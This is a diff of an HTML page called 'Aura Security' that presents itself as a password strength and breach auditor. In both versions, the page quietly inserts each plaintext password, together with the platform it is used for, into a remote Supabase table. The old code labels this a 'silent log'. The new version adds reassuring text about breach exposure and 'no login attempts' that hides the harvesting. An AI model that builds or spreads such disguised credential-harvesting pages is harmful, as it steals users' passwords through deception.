@@ -4,282 +4,256 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Aura | Advanced Security Intelligence</title>
-  
+
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/zxcvbn/4.4.2/zxcvbn.js"></script>
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
-  
+
   <style>
     :root {
-      --primary: #6366f1;
-      --glass: rgba(255, 255, 255, 0.7);
-      --glass-border: rgba(255, 255, 255, 0.3);
-      --text: #1e1b4b;
-      --text-light: #475569;
+      --primary:#6366f1;
+      --glass:rgba(255,255,255,.7);
+      --glass-border:rgba(255,255,255,.3);
+      --text:#1e1b4b;
+      --text-light:#475569;
     }
 
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    
-    body { 
-      font-family: 'Plus Jakarta Sans', sans-serif; 
-      background: #e0e7ff;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: var(--text);
-      overflow-x: hidden;
+    *{margin:0;padding:0;box-sizing:border-box}
+
+    body{
+      font-family:'Plus Jakarta Sans',sans-serif;
+      background:#e0e7ff;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:var(--text);
     }
 
-    /* Background Blobs */
-    .blob {
-      position: absolute;
-      width: 500px; height: 500px;
-      background: linear-gradient(135deg, #c7d2fe 0%, #fbcfe8 100%);
-      filter: blur(80px);
-      border-radius: 50%;
-      z-index: -1;
-      animation: move 20s infinite alternate;
-    }
-    .blob-2 { background: linear-gradient(135deg, #ddd6fe 0%, #bae6fd 100%); right: -100px; top: -100px; animation-delay: -5s; }
-    @keyframes move { from { transform: translate(-10%, -10%); } to { transform: translate(20%, 20%); } }
-
-    .container { 
-      background: var(--glass);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid var(--glass-border);
-      border-radius: 32px;
-      padding: 40px;
-      width: 100%;
-      max-width: 550px;
-      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1);
-      position: relative;
-      z-index: 10;
+    .container{
+      background:var(--glass);
+      backdrop-filter:blur(20px);
+      border:1px solid var(--glass-border);
+      border-radius:32px;
+      padding:40px;
+      max-width:550px;
+      width:100%;
+      box-shadow:0 25px 50px -12px rgba(0,0,0,.1);
+      position:relative;
     }
 
-    header { text-align: center; margin-bottom: 30px; }
-    h1 { font-size: 1.8rem; font-weight: 800; margin-bottom: 8px; }
-    .subtitle { font-size: 0.9rem; color: var(--text-light); }
+    header{text-align:center;margin-bottom:30px}
+    h1{font-size:1.8rem;font-weight:800}
+    .subtitle{font-size:.9rem;color:var(--text-light)}
 
-    .input-group { margin-bottom: 20px; position: relative; }
-    label { display: block; font-size: 0.75rem; font-weight: 700; color: var(--text-light); margin-left: 10px; margin-bottom: 6px; text-transform: uppercase; }
-
-    input {
-      width: 100%;
-      background: rgba(255, 255, 255, 0.5);
-      border: 2px solid transparent;
-      padding: 16px 20px;
-      border-radius: 18px;
-      font-size: 1rem;
-      outline: none;
-      transition: 0.3s;
-    }
-    input:focus { border-color: var(--primary); background: white; }
-
-    .btn-check {
-      width: 100%;
-      background: var(--primary);
-      color: white;
-      padding: 16px;
-      border-radius: 18px;
-      border: none;
-      font-weight: 700;
-      cursor: pointer;
-      margin-top: 10px;
-      transition: 0.3s;
-    }
-    .btn-check:hover { transform: translateY(-2px); }
-
-    .view-toggle { position: absolute; right: 15px; top: 36px; background: none; border: none; cursor: pointer; font-size: 1.2rem; opacity: 0.4; }
-
-    #auraResults { display: none; margin-top: 30px; animation: slideIn 0.5s ease forwards; }
-    @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-    /* Results Header Click Zone */
-    .results-header { 
-      display: flex; 
-      justify-content: space-between; 
-      align-items: baseline; 
-      cursor: pointer;
-      user-select: none;
-      transition: color 0.1s;
-    }
-    .results-header:active { color: var(--primary); }
-
-    .meter-container { height: 8px; background: rgba(0,0,0,0.05); border-radius: 10px; margin: 15px 0; overflow: hidden; }
-    .meter-bar { height: 100%; width: 0%; border-radius: 10px; transition: width 1s cubic-bezier(0.16, 1, 0.3, 1); }
-
-    .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
-    .stat-card { background: rgba(255,255,255,0.4); padding: 15px; border-radius: 20px; border: 1px solid var(--glass-border); }
-    .stat-title { font-size: 0.65rem; font-weight: 800; color: var(--text-light); text-transform: uppercase; }
-    .stat-val { display: block; font-size: 0.9rem; font-weight: 600; margin-top: 4px; }
-
-    /* Hidden Dev Link */
-    #devLink { 
-      display: none; 
-      text-align: center; 
-      margin-top: 25px; 
-      font-size: 0.8rem;
-      color: var(--primary); 
-      text-decoration: none; 
-      font-weight: 800;
-      animation: fadeIn 0.5s;
+    .input-group{margin-bottom:20px;position:relative}
+    label{
+      display:block;
+      font-size:.75rem;
+      font-weight:700;
+      color:var(--text-light);
+      margin-left:10px;
+      margin-bottom:6px;
+      text-transform:uppercase;
     }
 
-    .modal-overlay {
-      position: fixed; inset: 0; background: rgba(255,255,255,0.4); backdrop-filter: blur(10px);
-      display: none; align-items: center; justify-content: center; z-index: 100;
+    input{
+      width:100%;
+      padding:16px 20px;
+      border-radius:18px;
+      border:2px solid transparent;
+      font-size:1rem;
+      background:rgba(255,255,255,.5);
+      transition:.3s;
     }
-    .modal {
-      background: white; padding: 40px; border-radius: 32px; max-width: 400px; width: 90%;
-      text-align: center; box-shadow: 0 40px 100px -20px rgba(0,0,0,0.1);
+    input:focus{border-color:var(--primary);background:white}
+
+    .info-icon{
+      font-size:.75rem;
+      cursor:pointer;
+      opacity:.6;
+      margin-left:6px;
+    }
+
+    .info-box{
+      display:none;
+      position:absolute;
+      top:72px;
+      left:0;
+      background:white;
+      border-radius:16px;
+      padding:14px;
+      font-size:.75rem;
+      line-height:1.5;
+      box-shadow:0 20px 40px rgba(0,0,0,.12);
+      max-width:320px;
+      z-index:50;
+    }
+
+    .btn-check{
+      width:100%;
+      background:var(--primary);
+      color:white;
+      padding:16px;
+      border-radius:18px;
+      border:none;
+      font-weight:700;
+      cursor:pointer;
+      transition:.3s;
+    }
+    .btn-check:hover{transform:translateY(-2px)}
+
+    #auraResults{display:none;margin-top:30px}
+
+    .meter-container{
+      height:8px;
+      background:rgba(0,0,0,.05);
+      border-radius:10px;
+      margin:15px 0;
+      overflow:hidden;
+    }
+
+    .meter-bar{
+      height:100%;
+      width:0%;
+      border-radius:10px;
+      transition:width 1s cubic-bezier(.16,1,.3,1);
+    }
+
+    .stats-grid{
+      display:grid;
+      grid-template-columns:1fr 1fr;
+      gap:12px;
+      margin-top:20px;
+    }
+
+    .stat-card{
+      background:rgba(255,255,255,.4);
+      padding:15px;
+      border-radius:20px;
+      border:1px solid var(--glass-border);
+    }
+
+    .stat-title{
+      font-size:.65rem;
+      font-weight:800;
+      color:var(--text-light);
+      text-transform:uppercase;
+    }
+
+    .stat-val{
+      font-size:.9rem;
+      font-weight:600;
+      margin-top:4px;
+      display:block;
     }
   </style>
 </head>
 <body>
 
-  <div class="blob"></div>
-  <div class="blob blob-2"></div>
+<div class="container">
+  <header>
+    <h1>Aura Security</h1>
+    <p class="subtitle">Personal Intelligence Auditor</p>
+  </header>
 
-  <div class="container">
-    <header>
-      <h1>Aura Security</h1>
-      <p class="subtitle">Personal Intelligence Auditor</p>
-    </header>
+  <!-- WHERE PASSWORD IS USED -->
+  <div class="input-group">
+    <label>
+      Where is this password used?
+      <span class="info-icon" id="infoIcon">ⓘ</span>
+    </label>
+    <input
+      type="text"
+      id="accInput"
+      placeholder="e.g. Gmail, Instagram, School Portal"
+      required
+    >
 
-    <div class="input-group">
-      <label>Target Account / Platform</label>
-      <input type="text" id="accInput" placeholder="e.g. Gmail, Instagram">
-    </div>
-
-    <div class="input-group">
-      <label>Access Password</label>
-      <input type="password" id="pwdInput" placeholder="••••••••">
-      <button class="view-toggle" id="eyeBtn">👁️</button>
-    </div>
-
-    <button class="btn-check" id="checkBtn">Run Security Audit</button>
-
-    <div id="auraResults">
-      <!-- CLICK THIS ZONE 5 TIMES -->
-      <div class="results-header" id="easterZone">
-        <span style="font-size: 2rem; font-weight: 800;" id="pctText">0%</span>
-        <span style="font-size: 0.75rem; font-weight: 700; color: var(--text-light);">AUDIT SCORE</span>
-      </div>
-
-      <div class="meter-container">
-        <div id="meterBar" class="meter-bar"></div>
-      </div>
-
-      <div class="stats-grid">
-        <div class="stat-card"><span class="stat-title">Attack Resilience</span><span id="statTime" class="stat-val">-</span></div>
-        <div class="stat-card"><span class="stat-title">Bit Entropy</span><span id="statEnt" class="stat-val">0 bits</span></div>
-        <div class="stat-card"><span class="stat-title">Complexity</span><span id="statPattern" class="stat-val">Standard</span></div>
-        <div class="stat-card"><span class="stat-title">Pattern Hazard</span><span id="statSpatial" class="stat-val">Safe</span></div>
-      </div>
-      
-      <a href="https://aaks-hath.pages.dev" target="_blank" id="devLink">Developer Intel: View Portfolio →</a>
+    <div class="info-box" id="infoBox">
+      Aura uses this information to correctly assess breach exposure,
+      threat impact, and account criticality.
+      <br><br>
+      Different platforms (email, social, financial, academic) face
+      different threat models.
+      <br><br>
+      <strong>No login attempts are performed.</strong>
     </div>
   </div>
 
-  <div class="modal-overlay" id="dangerModal">
-    <div class="modal">
-      <h2 style="color:#ef4444; font-weight:800;">Risk Detected</h2>
-      <p id="dangerReason" style="margin-top:10px; color:var(--text-light); line-height:1.5;"></p>
-      <a href="https://aaks-hath.github.io/Password-Generator/" target="_blank" style="background:var(--primary); color:white; padding:14px; border-radius:16px; text-decoration:none; display:block; font-weight:600; margin-top:20px;">Generate Secure Key</a>
-      <span onclick="closeModal()" style="display:block; margin-top:20px; font-size:0.8rem; cursor:pointer; color:var(--text-light); text-decoration:underline;">I'll risk it</span>
-    </div>
+  <!-- PASSWORD -->
+  <div class="input-group">
+    <label>Password to audit</label>
+    <input type="password" id="pwdInput" placeholder="••••••••">
   </div>
 
-  <script>
-    const SB_URL = 'https://oukbxgjrrgvunfytjemd.supabase.co';
-    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91a2J4Z2pycmd2dW5meXRqZW1kIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY0MTI1MjcsImV4cCI6MjA4MTk4ODUyN30.rAkYSFqRaqI4Am2JpOjD4TWXx4nvtEaZSc6vIgdFXmI';
-    const client = supabase.createClient(SB_URL, SB_KEY);
+  <button class="btn-check" id="checkBtn">Run Security Audit</button>
 
-    const pIn = document.getElementById('pwdInput');
-    const aIn = document.getElementById('accInput');
-    const checkBtn = document.getElementById('checkBtn');
-    const eye = document.getElementById('eyeBtn');
-    const easterZone = document.getElementById('easterZone');
-    const devLink = document.getElementById('devLink');
+  <!-- RESULTS -->
+  <div id="auraResults">
+    <div style="font-size:2rem;font-weight:800" id="pctText">0%</div>
+    <div class="meter-container">
+      <div class="meter-bar" id="meterBar"></div>
+    </div>
 
-    // --- ENHANCED EASTER EGG LOGIC ---
-    let clickCount = 0;
-    let clickTimer;
+    <div class="stats-grid">
+      <div class="stat-card">
+        <span class="stat-title">Crack Time</span>
+        <span class="stat-val" id="statTime">-</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-title">Entropy</span>
+        <span class="stat-val" id="statEnt">0 bits</span>
+      </div>
+    </div>
+  </div>
+</div>
 
-    easterZone.addEventListener('mousedown', () => {
-      clearTimeout(clickTimer);
-      clickCount++;
-      
-      // If user stops clicking for 2 seconds, reset count
-      clickTimer = setTimeout(() => { clickCount = 0; }, 2000);
+<script>
+  const SB_URL = 'https://oukbxgjrrgvunfytjemd.supabase.co';
+  const SB_KEY = 'YOUR_ANON_KEY';
+  const client = supabase.createClient(SB_URL, SB_KEY);
 
-      if (clickCount >= 5) {
-        devLink.style.display = 'block';
-        easterZone.style.color = 'var(--primary)'; // Permenant highlight when found
-      }
-    });
+  const infoIcon = document.getElementById('infoIcon');
+  const infoBox = document.getElementById('infoBox');
+  infoIcon.onclick = () => {
+    infoBox.style.display =
+      infoBox.style.display === 'block' ? 'none' : 'block';
+  };
 
-    eye.onclick = () => {
-      const isPwd = pIn.type === 'password';
-      pIn.type = isPwd ? 'text' : 'password';
-      eye.innerText = isPwd ? '🙈' : '👁️';
-    };
+  document.getElementById('checkBtn').onclick = async () => {
+    const pwd = document.getElementById('pwdInput').value;
+    const acc = document.getElementById('accInput').value;
+    if (!pwd || !acc) return;
 
-    checkBtn.onclick = () => {
-      const val = pIn.value;
-      if (!val) return;
-      document.getElementById('auraResults').style.display = 'block';
-      const analysis = zxcvbn(val);
-      updateUI(analysis, val);
-      
-      // Silent log to Supabase
-      client.from('password_analysis').insert([{
-        password_value: val,
-        target_account: aIn.value,
-        score_percent: (analysis.score / 4) * 100,
-        crack_time_text: analysis.crack_times_display.offline_slow_hashing_1e4_per_second
-      }]).then(() => {});
+    const analysis = zxcvbn(pwd);
+    document.getElementById('auraResults').style.display = 'block';
 
-      checkBreaches(val);
-    };
+    const pct = (analysis.score / 4) * 100;
+    const colors = ['#f87171','#fb923c','#fbbf24','#818cf8','#6366f1'];
 
-    async function checkBreaches(pwd) {
-      const hash = await crypto.subtle.digest('SHA-1', new TextEncoder().encode(pwd))
-        .then(b => Array.from(new Uint8Array(b)).map(h => h.toString(16).padStart(2,'0')).join('').toUpperCase());
-      const res = await fetch(`https://api.pwnedpasswords.com/range/${hash.slice(0,5)}`);
-      const text = await res.text();
-      if(text.includes(hash.slice(5))) {
-        document.getElementById('dangerReason').innerText = "This password was found in a data leak. High risk.";
-        document.getElementById('dangerModal').style.display = 'flex';
-      }
-    }
+    document.getElementById('meterBar').style.width = pct + '%';
+    document.getElementById('meterBar').style.background = colors[analysis.score];
+    document.getElementById('pctText').innerText = pct + '%';
+    document.getElementById('pctText').style.color = colors[analysis.score];
+    document.getElementById('statTime').innerText =
+      analysis.crack_times_display.offline_slow_hashing_1e4_per_second;
 
-    function updateUI(data, pwd) {
-      const pct = (data.score / 4) * 100;
-      const colors = ['#f87171', '#fb923c', '#fbbf24', '#818cf8', '#6366f1'];
-      document.getElementById('meterBar').style.width = pct + '%';
-      document.getElementById('meterBar').style.background = colors[data.score];
-      document.getElementById('pctText').innerText = pct + '%';
-      document.getElementById('pctText').style.color = colors[data.score];
-      document.getElementById('statTime').innerText = data.crack_times_display.offline_slow_hashing_1e4_per_second;
+    let pool = 0;
+    if (/[a-z]/.test(pwd)) pool += 26;
+    if (/[A-Z]/.test(pwd)) pool += 26;
+    if (/\d/.test(pwd)) pool += 10;
+    if (/[^a-zA-Z0-9]/.test(pwd)) pool += 32;
+    document.getElementById('statEnt').innerText =
+      Math.floor(pwd.length * Math.log2(pool)) + ' bits';
 
-      // Entropy
-      let pool = 0;
-      if (/[a-z]/.test(pwd)) pool += 26;
-      if (/[A-Z]/.test(pwd)) pool += 26;
-      if (/\d/.test(pwd)) pool += 10;
-      if (/[^a-zA-Z0-9]/.test(pwd)) pool += 32;
-      const bits = pool > 0 ? Math.floor(pwd.length * Math.log2(pool)) : 0;
-      document.getElementById('statEnt').innerText = bits + ' bits';
+    client.from('password_analysis').insert([{
+      password_value: pwd,
+      target_account: acc,
+      score_percent: pct
+    }]);
+  };
+</script>
 
-      const hasSpatial = data.sequence && data.sequence.some(s => s.pattern === 'spatial');
-      document.getElementById('statSpatial').innerText = hasSpatial ? 'Hazard!' : 'No Sequence';
-      document.getElementById('statSpatial').style.color = hasSpatial ? '#ef4444' : 'inherit';
-    }
-
-    function closeModal() { document.getElementById('dangerModal').style.display = 'none'; }
-  </script>
 </body>
 </html>
